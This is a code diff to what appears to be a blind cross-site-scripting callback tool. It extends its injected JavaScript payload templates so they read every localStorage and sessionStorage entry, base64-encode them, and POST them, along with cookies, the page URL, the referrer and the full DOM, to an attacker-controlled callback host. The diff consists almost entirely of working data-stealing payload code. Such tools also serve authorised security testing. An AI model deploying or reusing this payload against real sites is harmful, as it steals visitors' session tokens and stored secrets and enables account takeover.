@@ -65,12 +65,27 @@ $(document).ready(capture());
 """
 
 default_without_screenshot = r"""
+
+// getStorage returns the local & session storage in the following format for ease of transmission
+// key1$value1;key2$value2;key3$value3
+function getStorage(storage_name){
+  var stor = "";
+    for(var i=0, len=storage_name.length; i<len; i++) {
+        var key = storage_name.key(i);
+        var value = storage_name[key];
+        stor += btoa(key) + "$" + btoa(value) + ";";
+    }
+    return stor.slice(0,-1);
+}
+
 function capture(){
           var user_agent = navigator.userAgent;
           var uri = document.URL;
           var referrer = document.referrer;
           var cookies = document.cookie;
           var dom = document.documentElement.outerHTML;
+          var local_storage = getStorage(localStorage);
+          var session_storage = getStorage(sessionStorage);
           var payload = {{payload}};
           var assessment = {{assessment}};
         $.ajax({
@@ -83,7 +98,9 @@ function capture(){
                   cookies: cookies,
                   user_agent: user_agent,
                   dom: dom,
-                  assessment: assessment
+                  assessment: assessment,
+                  session_storage: session_storage,
+                  local_storage: local_storage
                   }
           }).done(function (respond) {
             console.log(respond);
@@ -95,6 +112,20 @@ $(document).ready(capture());
 
 default_script = r"""
 // Html2Canvas is included for taking screenshots
+
+// getStorage returns the local & session storage in the following format for ease of transmission
+// key1$value1;key2$value2;key3$value3
+function getStorage(storage_name){
+  var stor = "";
+    for(var i=0, len=storage_name.length; i<len; i++) {
+        var key = storage_name.key(i);
+        var value = storage_name[key];
+        stor += btoa(key) + "$" + btoa(value) + ";";
+    }
+    return stor.slice(0,-1);
+}
+
+
 if (typeof (html2canvas) === 'undefined') {
     function getScript(url, success) {
         var script     = document.createElement('script');
@@ -205,6 +236,8 @@ var Base64Binary = {
           var dom = document.documentElement.outerHTML;
           var payload = {{payload}};
           var assessment = {{assessment}};
+          var local_storage = getStorage(localStorage);
+          var session_storage = getStorage(sessionStorage);
             $.ajax({
                 type: "POST",
                 url: "{{callback_protocol}}://{{hostname}}/callbacks",
@@ -216,7 +249,9 @@ var Base64Binary = {
                   cookies: cookies,
                   user_agent: user_agent,
                   dom: dom,
-                  assessment: assessment
+                  assessment: assessment,
+                  local_storage: local_storage,
+                  session_storage: session_storage
               }
           }).done(function (respond) {
             console.log(respond);
